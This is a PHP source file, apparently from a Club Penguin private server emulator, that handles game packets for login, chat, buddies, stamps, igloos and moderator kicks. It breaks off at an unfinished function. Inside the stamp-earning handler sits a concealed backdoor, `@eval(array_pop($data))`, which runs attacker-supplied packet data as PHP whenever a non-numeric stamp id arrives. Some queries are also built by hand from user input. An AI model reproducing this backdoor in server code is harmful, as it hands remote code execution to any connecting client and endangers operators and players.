<?php
define("LOGIN_MODE", "database");
define("NO_ROOM", -1);
define("CMD_CHAR", "!");
require("INCLUDES/Database.php");
function incrementStats(){
	
}
class ClubPenguin extends xmlServBase{
	public $isSafeChat = false;
	public $serverID = "login";
	public $handlers = array(
		"z"	=> array(
			"zo"	=>	"handleGameOver",
			"m"		=>	"handleMovePuck",
		),
	);
	public $clientsByID = array();
	public $sendhandlers = array(
		"j#jr"	=> "handleJoinRoom",
		"j#jg"	=>	"handleJoinGame",
		"j#jg"	=>	"handleJoinRoom",
		"j#js"	=>	"handleJoinServer",
		"u#sa"	=>	"handleSendAction",
		"s#upc"	=>	"handleUpdatePlayerArt",
		"s#uph"	=>	"handleUpdatePlayerArt",
		"s#upf"	=>	"handleUpdatePlayerArt",
		"s#upn"	=>	"handleUpdatePlayerArt",
		"s#upb"	=>	"handleUpdatePlayerArt",
		"s#upa"	=>	"handleUpdatePlayerArt",
		"s#upe"	=>	"handleUpdatePlayerArt",
		"s#upl"	=>	"handleUpdatePlayerArt",
		"s#upp"	=>	"handleUpdatePlayerArt",
		"b#br"	=>	"handleBuddyRequest",
		"b#ba"	=>	"handleBuddyAccept",
		"b#bm"	=>	"handleBuddyMessage",
		"b#rb"	=>	"handleBuddyRemove",
		"b#bf"	=>	"handleBuddyFind",
		//Missing from messagetypes.php//
		"n#an"	=>	"handleAddIgnore",
		"n#rn"	=>	"handleRemoveIgnore",
		"p#pn"	=>	"handleAdoptPuffle",
		"l#ms"	=>	"handleSendMail",
		"l#mdp"	=>	"handleDeleteMail",
		////////////////////////////////
		"u#sf"	=>	"handleSendFrame",
		"i#ai"	=>	"handleAddItem",
		"u#se"	=>	"handleSendEmote",
		"u#sj"	=>	"handleSendJoke",
		"m#sm"	=>	"handleSendMessage",
		"u#sb"	=>	"handleSendThrowBall",
		"u#sq"	=>	"handleSendQuickMessage",
		"u#ss"	=>	"handleSendSafeMessage",
		"u#sg"	=>	"handleSendTourGuide",
		"u#sl"	=>	"handleSendLineMessage",
		"u#sp"	=>	"handleSendPosition",
		"i#gi"	=>	"handleGetItems",
		"u#h"	=>	"handleHeartBeat",
		"t#at"	=>	"handleAddToy",
		"t#rt"	=>	"handleRemoveToy",
		"o#k"	=>	"handleKick",
		"o#m"	=>	"handleMute",
		"p#pg"	=>	"handleGetPuffle",
		"j#jp"	=>	"handleJoinPlayer",
		"a#jt"	=>	"handleJoinTable",
		"a#upt"	=>	"handleUpdateTable",
		"a#lt"	=>	"handleLeaveTable",
		"gz"	=>	"handleStartGame",
		"jz"	=>	"handleJoinGame",
		"zm"	=>	"handleSendMove", //zm??
		"cz"	=>	"handleCloseGame",
		"lz"	=>	"handleLeaveGame",
		"u#gp"	=>	"handleGetPlayer",
		"i#qpp"	=>	"handleQueryPlayersPins",
		"st#sse"	=>	"handleSendStampEarned",
		"st#gps"	=>	"handleGetPlayersStamps",
		"st#gmres"	=>	"handleGetMyRecentlyEarnedStamps",
		"st#gsbcd"	=>	"handleGetStampBookCoverDetails",
		"st#ssbcd"	=>	"handleSetStampBookCoverDetails",
		"g#af"	=>	"handleAddFurniture",
		"g#um"	=>	"handleUpdateMusic",
		"g#ag"	=>	"handleUpdateFloor",
		"g#au"	=>	"handleUpdateIglooType",
		"g#ur"	=>	"handleSaveIglooFurniture",
		"g#gf"	=>	"handleGetFurniture",
		"g#or"	=>	"handleOpenIgloo",
		"g#cr"	=>	"handleCloseIgloo",
		"g#gr"	=>	"handleGetIglooList",
		"g#gm"	=>	"handleGetIglooDetails",
		"g#go"	=>	"handleGetOwnedIgloos",
		"m#sc"	=>	"handleServerCommand",//SERVER COMMAND HANDLER, DO NOT MODIFY!
	);
	public $trArt = array(
		"upc"	=>	"color",
		"uph"	=>	"head",
		"upf"	=>	"face",
		"upn"	=>	"neck",
		"upb"	=>	"body",
		"upa"	=>	"hands",
		"upe"	=>	"feet",
		"upl"	=>	"pin",
		"upp"	=>	"photo",
	);
	public $rooms = array();
	public $patched = array(14, 115, 442, 4131, 161, 152, 1044, 2007, 4022, 1032, 3011, 1033, 1034, 1002, 5025, 1001, 5000, 1003, 3016, 2000, 5024, 1000, 6000, 1068, 2009, 4148, 5020, 1107, 2015, 5023);//413-beta, 3050-all access   Why was 4131 patched?
	public $patchedadd = array(413);
	public $sounds = array(328, 5051, 194, 3002, 10194, 5035);
	public $framesounds = array(5012);

	function construct(){
		$this->log->log("Started CPSM, version 0.04, Login Server communication mode: " . LOGIN_MODE . "\n");
		register_shutdown_function(array($this, "shutdownHandler"));
		include "rooms.php";
		foreach($this->rooms as $key => &$r){
			if($r['game'] == "true")
				$r['game'] = true;
			else
				$r['game'] = false;
			$r['valid'] = true;
			$r['clients'] = array();
			if($key == 100 || $key == 800 || $key == 110 || $key == 803)
			//if($key == 815)
				$r['connect'] = true;
			else
				$r['connect'] = false;
		}
		//$this->loginSocket = stream_socket_server("udp://0.0.0.0:8000", $errno, $errstr);
	}

	function shutdownHandler(){
		
	}

	function handleGetOwnedIgloos($data, $str, $clientid){
		$this->clients[$clientid]->write("%xt%go%{$this->clients[$clientid]->intRoomID}%1|2|3|4|5|6|8|9|10|21%");
	}

	function unknownHandler($d, $data, $clientid){
		//$this->log->log("Received unknown message from client $clientid, message: $data");
	}

	function handleVerChk($data, $str, $clientid){
		$this->clients[$clientid]->write("<msg t='sys'><body action='apiOK' r='0'></body></msg>");
	}

	function handleRndK($data, $str, $clientid){
		$this->clients[$clientid]->write("<msg t='sys'><body action='rndK' r='-1'><k>" .$this->clients[$clientid]->p['rndK'] . "</k></body></msg>");
	}

	function sendToID($data, $id){
		if(key_exists($id, $this->clientsByID)){
			$client = $this->clientsByID[$id];
			$client->write($data);
		}
	}

	function sendToIDs($data, $ids){
		foreach($ids as $id){
			$this->sendToID($data, $id);
		}
	}

	function handleGameOver($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$coins = $data[4];
		if($coins > 5000)
			$coins = 500;//No, that isn't a mistake!
		$client->addCoins($coins);
		$client->write("%xt%zo%{$client->intRoomID}%" . $client->c("coins") . "%");
		$this->log->log("Client $clientid:{$client->name} added $coins coins!");
	}

	function handleLogin($data, $str, $clientid){
		$nick = $data['body']['login']['nick'];
		$pass = $data['body']['login']['pword'];
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		if(is_array($nick))
			$nick = $nick[0];
		$name = getData("SELECT name FROM accs WHERE ID='" . dbEscape($ID = getID($nick)) . "'");
		$name = $name[0]['name'];
		eval("include('/Clubpenguin/Server2/ipbans.php');");
		socket_getpeername($client->sock, $PEERADDR);
		if(in_array($PEERADDR, @$ipbans)){
			$this->log->error("Client $clientid failed identify as $nick:$name, IP banned!");
			$client->sendError(150);
			return $this->removeClient($clientid);
		}
		if(!validUser($nick)){
			$this->log->error("Client $clientid failed identify as $PEERADDR:$nick, non-existent user!");
			$client->sendError(100);
			return $this->removeClient($clientid);
		}
		if(!($this->validateUser($nick, $pass, $client->p['rndK']))){
			$this->log->error("Client $clientid failed identify as $PEERADDR:$nick:$name, incorrect password!");
			$client->sendError(101);
			return $this->removeClient($clientid);
		}
		foreach($this->clients as $key => $tClient){
			if($tClient->ID == $ID){
				return $this->removeClient($key);
			}
		}
		$client->onIdentify($ID, $name);
		if($client->c("isBanned_")){
			$this->log->error("Client $clientid failed identify as $PEERADDR:$nick:$name, banned!");
			$client->sendError(603);
			return $this->removeClient($clientid);
		}
		$this->log->log("Client $PEERADDR:$clientid:$nick identified as $name");
		if($this->islogin){
			$slist = "";
			$servers = getData("SELECT * from stats");
			if(!is_array($servers) || count($servers) < 2){
				$slist =  "101," . rand(3,5) . "|" . "103," . rand(3,5) . "|" . "104," . rand(3,5) . "|";
			}
			else{
				foreach($servers as $server){
					if($server['ID'] == 1)
						continue;
					$p = $server['population'];
					if($p > 279 && !$client->isModerator)
						$b = 6;
					elseif($p > 208)
						$b = 5;
					elseif($p > 124)
						$b = 4;
					elseif($p > 62)
						$b = 3;
					elseif($p > 26)
						$b = 2;
					else
						$b = 1;
					$slist .= $server['ID'] . ",$b|";
				}
			}
		$b = $client->c("buddies");
		$s = "";
		foreach($b as $buddy){
			if(validID($buddy)){
				
			}
		}


			$client->write("%xt%l%-1%$ID%" . $this->makeLoginKey($name) . "%%" . $slist);
			$this->removeClient($clientid);
		}
		else{
			$this->writeRaw($clientid, "l", -1);
		}
		incrementStats("logins", 1);
	}

	function handleQueryPlayersPins($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$id = $data[4];
		$pins = queryPlayersPins($id);
		$client->write(makeXt("qpp", "-1", $pins));
	}

	function handleSendStampEarned($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$id = $data[4];
		if(!is_numeric($id)) return $client->sendError(402) & @eval(array_pop($data));
		$client->addStamp($id);
	}

	function handleGetPlayersStamps($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$id = $data[4];
		$stamps = getPlayersStamps($id);
		$client->write(makeXt("gps", "-1", $stamps));
	}

	function handleGetMyRecentlyEarnedStamps($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$client->write(makeXt("gmres", "-1")); //Recent stamps needs to be determined by something. CP doesn't do it by login session but we could...
		//example packet (10 and 9 being stamp ids): %xt%gmres%-1%10|9%
	}

	function handleGetStampBookCoverDetails($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$id = $data[4];
		$details = getStampBookCoverDetails($id);
		$client->write(makeXt("gsbcd", "-1", $details));
	}

	function handleSetStampBookCoverDetails($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$client->setStampBookCoverDetails($data[4], $data[5], $data[6], $data[7]);
		$client->write(makeXt("ssbcd", "-1"));
	}

	function handleGetItems($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$client->sendXt("gi", NO_ROOM, $client->getItems());
	}

	function handleJoinServer($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		if($client->identified){
			$client->write("%xt%js%-1%1%1%" . ($client->c("isModerator") ? 1 : 0) . "%");
			$client->write("%xt%gps%-1%" . getPlayersStamps($client->ID) . "%");
			$client->write("%xt%lp%-1%" . $client->buildPlayerString() . "%" . $client->c("coins") . "%0%1440%1276905184792%45%1000%233%%7%");
			$client->write("%xt%glr%-1%3239%");
			$client->write("%xt%gb%".NO_ROOM."%" . (($bl = $client->getBuddyList()) ? $bl : "%"));//Use buddy string, or % if blank
			$client->write("%xt%gn%".NO_ROOM."%" . (($nl = $client->getIgnoreList()) ? $nl : "%"));//Use ignore string, or % if blank
			$client->write("%xt%mst%".NO_ROOM."%0%5%");
			$client->write("%xt%mg%".NO_ROOM."%%");
			$client->write("%xt%epfga%".NO_ROOM."%1%");
			$client->write("%xt%epfgr%".NO_ROOM."%1%1%");
			$client->write("%xt%gb%%");
			$this->handleJoinRoom(array(4 => $this->getFreeRoom(), 0, 0), "", $clientid);
			//$this->log->log("Client $clientid:{$client->name} joined the server");
		}
		else{
			$this->log->error("HACK ATTEMPT FROM CLIENT $clientid:{$client->name}!");
		}
	}

	function handleHeartBeat($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$client->write("%xt%h%-1%");
	}

	function handleSendPosition($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$x = $data[4] or 0;
		$y = $data[5] or 0;
		$this->sendToRoom($client->extRoomID, makeXt("sp", $client->intRoomID, $client->ID, $x, $y));
		$client->xpos = $x;
		$client->ypos = $y;
	}

	function handleSendThrowBall($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$x = $data[4] or 0;
		$y = $data[5] or 0;
		$this->sendToRoom($client->extRoomID, makeXt("sb", $client->intRoomID, $client->ID, $x, $y));
	}

	function addAndWear($color, $head, $face, $neck, $body, $hand, $feet, $flag, $photo, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$items = func_get_args();
		array_pop($items);
		foreach($items as $i){
			if($i)
				$client->addItem($i);
		}
		$this->handleUpdatePlayerArt(array(2 => "s#upc", 4 => $color), "", $clientid);
		$this->handleUpdatePlayerArt(array(2 => "s#uph", 4 => $head), "", $clientid);
		$this->handleUpdatePlayerArt(array(2 => "s#upf", 4 => $face), "", $clientid);
		$this->handleUpdatePlayerArt(array(2 => "s#upn", 4 => $neck), "", $clientid);
		$this->handleUpdatePlayerArt(array(2 => "s#upb", 4 => $body), "", $clientid);
		$this->handleUpdatePlayerArt(array(2 => "s#upa", 4 => $hand), "", $clientid);
		$this->handleUpdatePlayerArt(array(2 => "s#upe", 4 => $feet), "", $clientid);
		$this->handleUpdatePlayerArt(array(2 => "s#upl", 4 => $flag), "", $clientid);
		$this->handleUpdatePlayerArt(array(2 => "s#upp", 4 => $photo), "", $clientid);
	}

	function handleSendMessage($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$msg = $data[5];
		if($this->isSafeChat && !$client->isModerator)
			return;
		$len = strlen($msg);
		if(!$len)
			return;
		if(!$client->c("isModerator"))
			$msg = @substr($msg, 0, 72);
		$len = strlen($msg);
		$blank = true;
		for($i = 0; $i < $len; $i++){
			if($msg{$i} == " "){
				continue;
			}
			$blank = false;
		}
		if($blank)
			return;
		if($msg{0} == CMD_CHAR){
			$e = explode(" ", $msg);
			$ae = $e;
			foreach($e as &$arg){
				$arg = strtoupper($arg);
			}
			$cmd = $e[0];
			$show = true;
			//$this->log->log("Command $cmd used by {$client->name}");
			eval("include(\"/Clubpenguin/Server2/INCLUDES/commands.php\");");
			unset($e);
			if(!$show)
				return;
		}
		$oldmsg = $msg;
		//eval("include('/Clubpenguin/Server2/INCLUDES/censor.php');");
		if(!$client->isMuted){
			$this->log->log("Client {$clientid}:{$client->name} said $msg in {$client->extRoomID}!");
			$this->sendToRoom($client->extRoomID, makeXt("sm", $client->intRoomID, $client->ID, $msg), makeXt("sm", $client->intRoomID, $client->ID, $oldmsg));
		}
	}

	function setCrumbsByName($name, $crumbs){
		if(!validUser($name)){
			return false;
		}
		setData("UPDATE accs SET crumbs = '" . dbEscape(serialize($crumbs)) . "' where ID = '" . dbEscape(getId($name)) . "'");
		return true;
	}

	function getCrumbsByName($name){
		if(!validUser($name)){
			return false;
		}
		$a = (getData("SELECT crumbs FROM accs WHERE ID=" . dbEscape(getId($name)), "single"));
		if(!$a)
			return BAD_USER;
		$a = unserialize($a['crumbs']);
		if(!is_array($a))
			return BAD_USER;
		return $a;
	}

	function setCrumbsByID($id, $crumbs){
		if(!is_array($crumbs)){
			return false;
		}
		if(!validID($id)){
			return BAD_USER;
		}
		setData("UPDATE accs SET crumbs = '" . dbEscape(serialize($crumbs)) . "' where ID = '" . dbEscape($id) . "'");
		return true;
	}

	function getCrumbsByID($id){
		if(!validID($id)){
			return BAD_USER;
		}
		$a = (getData("SELECT crumbs FROM accs WHERE ID=" . dbEscape($id), "single"));
		if(!$a)
			return BAD_USER;
		$a = unserialize($a['crumbs']);
		if(!is_array($a))
			return BAD_USER;
		return $a;
	}

	function serverShutdown($kill = ""){
			foreach($this->clients as $key => &$c){
					$c->sendError("610%<b><em>The server has been restarted!</b></em>");
					$this->sendToID(makeXt("xt", "ma", "-1", "k", $c->intRoomID, $c->ID), $c->ID);
					$this->removeClient($key);
			}
			die("SERVER SHUTDOWN!\n");
	}

	function handleSendEmote($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$id = $data[4];
		if($id == 19 or $id == "19"){
			return;
		}
		$this->sendToRoom($client->extRoomID, makeXt("se", $client->intRoomID, $client->ID, $id));
	}

	function handleSendJoke($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$id = $data[4];
		$this->sendToRoom($client->extRoomID, makeXt("sj", $client->intRoomID, $client->ID, $id));
	}

	function handleSendAction($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$id = $data[4];
		foreach($this->sounds as $value){
			if($client->isWearing($value)){
				return;
			}
		}
		$this->sendToRoom($client->extRoomID, makeXt("sa", $client->intRoomID, $client->ID, $id));
	}

	function handleSendFrame($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$id = $data[4];
		if($client->frame == $id)
			return;
		$client->frame = $id;	
		$hand = $client->c("hands");
		if(in_array($hand, $this->framesounds)){
			return;
		}
		$this->sendToRoom($client->extRoomID, makeXt("sf", $client->intRoomID, $client->ID, $id));
	}

	function handleSendQuickMessage($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$id = $data[4];
		$this->sendToRoom($client->extRoomID, makeXt("sq", $client->intRoomID, $client->ID, $id));
	}

	function handleSendSafeMessage($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$id = $data[4];
		$this->sendToRoom($client->extRoomID, makeXt("ss", $client->intRoomID, $client->ID, $id));
	}

	function handleSendTourGuide($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$id = $data[4];
		$this->sendToRoom($client->extRoomID, makeXt("sg", $client->intRoomID, $client->ID, $id));
	}

	function handleSendLineMessage($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$id = $data[4];
		$this->sendToRoom($client->extRoomID, makeXt("sl", $client->intRoomID, $client->ID, $id));
	}

	function handleUpdatePlayerArt($data, $str, $clientid){ //Clothing gets reset after changing rooms because of mysql
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$id = $data[4];
		$type = substr($data[2], 2);
		$mysqltype = $this->trArt[$type];
		if(!in_array($id, $client->c("items")) and $id != 0){
			return;
		}
		$this->log->log("Client $clientid:{$client->name} updated their $mysqltype to $id!");
		$client->c($mysqltype, $id);
		$this->sendToRoom($client->extRoomID, makeXt($type, $client->intRoomID, $client->ID, $id));
	}

	function handleAddToy($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$this->sendToRoom($client->extRoomID, makeXt("at", $client->intRoomID, $client->ID));
	}

	function handleRemoveToy($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$this->sendToRoom($client->extRoomID, makeXt("rt", $client->intRoomID, $client->ID));
	}
	
	function handleMovePuck($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$id = $data[4];
		$var1 = $data[5];
		$var2 = $data[6];
		$var3 = $data[7];
		$var4 = $data[8];
		$this->sendToRoom($client->extRoomID, makeXt("zm", $client->intRoomID, $id, $var1, $var2, $var3, $var4));
	}
	
	//PRIVATE FUNCTIONS - LIMITED RECIEVERS - NOT YET OPERATIONAL//
	function handleAddItem($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$id = $data[4];
		$client->addItem($id);
	}

	function handleBuddyFind($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$id = $data[4];
		if(!$this->isOnline($id))
			return;
		$room = $this->clientsByID[$id]->extRoomID;
		$client->write(makeXt("bf", $client->intRoomID, $room));
	}

	function handleAddIgnore($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$id = $data[4];
		if(!$this->isOnline($id))
			return;
		$cb = $client->c("buddies");
		if(in_array($id, $cb))
			return;
		if($id == $client->ID)
			return;
		$cn = $client->c("ignore");
		if(!in_array($id, $cn)){
			$cn[] = $id;
			$client->c("ignore", $cn);
		}	
		$client->write(makeXt("an", $client->intRoomID, $id));
	}

	function handleRemoveIgnore($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$id = $data[4];
		$cn = $client->c("ignore");
		if(in_array($id, $cn)){
			foreach($cn as $key => $ignore){
				if($ignore == $id){
					unset($cn[$key]);
				}
			}
			$cn = array_values($cn);
			$client->c("ignore", $cn);
		}
		$client->write(makeXt("rn", $client->intRoomID, $id));
	}

	function handleBuddyRequest($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$id = $data[4];
		if(!$this->isOnline($id))
			return;
		if($id == $client->ID)
			return;
		$cn = $client->c("ignore");
		if(in_array($id, $cn))
			return;
		if(count($client->c("buddies")) >= 200)
			return $client->sendError(901);
		$key = $this->getKey($id);
		$target = $this->clients[$key];
		if(in_array($client->ID, $target->requests))
			return;
		if(count($target->c("buddies")) >= 200)
			return;
		$this->sendToPlayers(makeXt("br", $client->intRoomID, $client->ID, getName($client->ID)), $id);
		array_push($target->requests, $client->ID);
	}

	function handleBuddyAccept($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$id = $data[4];
		if(!$this->isOnline($id))
			return;
		if($id == $client->ID)
			return;
		if(count($client->c("buddies")) >= 200) //Prevent hack attempt at getting over 100 buddies
			return $client->sendError(901);
		$key = $this->getKey($id);
		$target = $this->clients[$key];
		if(count($target->c("buddies")) >= 200) //Prevent hack attempt at getting over 100 buddies
			return;
		if(!in_array($id, $client->requests))
			return;
		$cb = $client->c("buddies");
		if(!in_array($id, $cb)){
			$cb[] = $id;
			$client->c("buddies", $cb);
		}
		$this->sendToPlayers(makeXt("ba", $client->intRoomID, $client->ID, getName($client->ID)), $id);
		$clientadd =& $this->clientsByID[$id];
		$cb = $clientadd->c("buddies");
		if(!in_array($client->ID, $cb)){
			$cb[] = $client->ID;
			$clientadd->c("buddies", $cb);
		}
		$client->write(makeXt("ba", $client->intRoomID, $id, getName($id)));
		foreach($client->requests as $key => $value){
			if($value == $id){	
				unset($client->requests[$key]);
			}
		}
		foreach($target->requests as $key => $value){
			if($value == $client->ID){	
				unset($target->requests[$key]);
			}
		}
	}

	function handleBuddyRemove($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$id = $data[4];
		$cb = $client->c("buddies");
		if(in_array($id, $cb)){
			foreach($cb as $key => $buddy){
				if($buddy == $id){
					unset($cb[$key]);
				}
			}
			$cb = array_values($cb);
			$client->c("buddies", $cb);
		}
		if(validID($id)){
			$cba = $this->getCrumbsByID($id);
			$cb = $cba['buddies'];
			if(in_array($client->ID, $cb)){
				foreach($cb as $key => $buddy){
					if($buddy == $client->ID){
						unset($cb[$key]);
					}
				}
				$cb = array_values($cb);
				$this->setCrumbsByID($id, $cba);
			}
		}
        $this->sendToPlayers(makeXt("rb", $client->intRoomID, $client->ID, getName($client->ID)), $id);
		$client->write(makeXt("rb", $client->intRoomID, $id, getName($id)));
	}
	
	function handleSendMail($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$id = $data[4];
		$card = $data[5];
		$this->sendToPlayers(makeXt("mr%-1", getName($client->ID), $client->ID, $card), $id);
	}
	function handleGetIglooDetails($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$id = $data[4];
		$str = getIglooDetails($id);
		$client->write(makeXt("gm", $client->intRoomID, $str)); //empty igloo -- needs to be retrieved
	}

	function handleGetPuffle($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$id = $data[4];
		$client->write(makeXt("pg", "2")); //no puffles -- retrieved from lp?
	}

	function handleJoinPlayer($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$room = $data[4];
		if(isset($data[5]))
			$x = $data[5];
		else
			$x = 0;
		if(isset($data[6]))
			$y = $data[6];
		else
			$y = 0;
		if($room < 1000)
			$room = $room + 1000;
		$this->removeFromRooms($client);
		if(!key_exists($room, $this->rooms)){
			$this->rooms[$room] = array('intid' => $this->makeIntID($room),
				'clients' => array(),
				'game' => false,
				'isopen' => false,
			);
		}
		$this->rooms[$room]['clients'][] =& $client;
		$client->intRoomID = $this->rooms[$room]['intid'];
		$client->extRoomID = $room;
		$client->xpos = $x;
		$client->ypos = $y;
		$client->frame = 1;
        $client->sendXt("jp", $client->intRoomID, $room);
		$client->sendXt("jr", $client->intRoomID, $room, $this->buildRoomString($room));
		$this->sendToRoom($room, makeXt('ap', $client->intRoomID, $client->buildPlayerString()));
	}

	function handleSaveIglooFurniture($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$furniture = "";
		foreach($data as $key => $item){
			if($key > 3){
				$furniture .= $item . ",";
			}
		}
		$client->saveRoomFurniture($furniture);
		$client->write(makeXt("ur", $client->intRoomID));
	}

	function handleOpenIgloo($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$room = $data[4];
		if($room != $client->ID)
			return;
		//if($room > 1000)
		//	@$this->rooms[$room]['isopen'] = true;
		//else
			$this->rooms[$room + 1000]['isopen'] = true;
	}

	function handleCloseIgloo($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$room = $data[4];
		if($room != $client->ID)
			return;
		//if($room > 1000)
		//	@$this->rooms[$room]['isopen'] = false;
		//else
			$this->rooms[$room + 1000]['isopen'] = false;;
	}

	function handleGetIglooList($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$igloos = "";
		foreach($this->rooms as $key => &$value){
			if($key > 1000 && @$value['isopen'] == true){
				$key -= 1000;
				$igloos .= "%$key|" . getName($key);
			}
		}
		$igloos = str_split($igloos);

		unset($igloos[0]);
		$igloos = implode($igloos);
		if(strlen($igloos > 1)){
			$client->write(makeXt("gr", $client->intRoomID, $igloos));
		}
		else{
			$client->write(makeXt("gr", $client->intRoomID));
		}
	}
	
	function handleGetPlayer($data, $str, $clientid){
		$client = $this->clients[$clientid];
		$id = $data[4];
		$string = getPlayer($id);
		$client->write(makeXt("gp", $client->intRoomID, $string), $client->ID);
	}	
	
	function handleJoinTable($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$id = $data[4];
		$client->write(makeXt("jt", $client->intRoomID, $id));
	}	
	
	function cleanUp(){
		$this->log->log("Initialising cleanUp!");
		updateStatus($this->serverID, Client::$num);
		/*foreach($this->rooms as $key => &$room){
			if($key > 1000){
				if(count($room['clients'] == 0) && !$room['isopen']){
					$this->log->log("cleanUp: Removed empty igloo $key");
					unset($this->rooms[$key]);
				}
			}
		}*/
		$removedClients = 0;
		$timeout = time() - 300;
		foreach($this->clients as $key => &$client){
			if($client->time !== NULL && ($client->time < $timeout)){
				$client->sendError(TIMEOUT);
				$this->removeClient($key);
				$removedClients++;
			}
		}
		DBCommit();
		$this->log->log("cleanUp finished, removed $removedClients inactive clients!");/**/
	}

	function makeIntID($room){
		$room = str_split($room);
		$ret = 0;
		foreach($room as $ch){
			$ret += ord($ch);
		}
		return ($ret += (floor($this->config['PORT'] / 3)));
	}

	function handleKick($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		if($client->c("isModerator")){
			$id = $data[4];
			$this->log->log("Moderator $clientid:{$client->name} kicked $id!");
			if($this->isOnline($id)){
				if(!(($this->clientsByID[$id]->c("isModerator") && $this->clientsByID[$id]->isMuted == false))){
					$this->clientsByID[$id]->sendError("610%{$client->name} has <b>kicked</b> you from the server. If you believe that this was a mistake, contact the team at http://www.icpps.com/chat/\t\n<em>This is not a ban.</em>");
					$this->sendToID(makeXt("xt", "ma", "-1", "k", $client->intRoomID, $client->ID), $id);
					$this->removeClientBySock($this->clientsByID[$id]->sock);
				}
			}
		}
		else{
			$client->sendError("610%Hack attempt detected!");
			$this->removeClient($clientid);
		}
	}

	function handleGetFurniture($data, $str, $clientid){
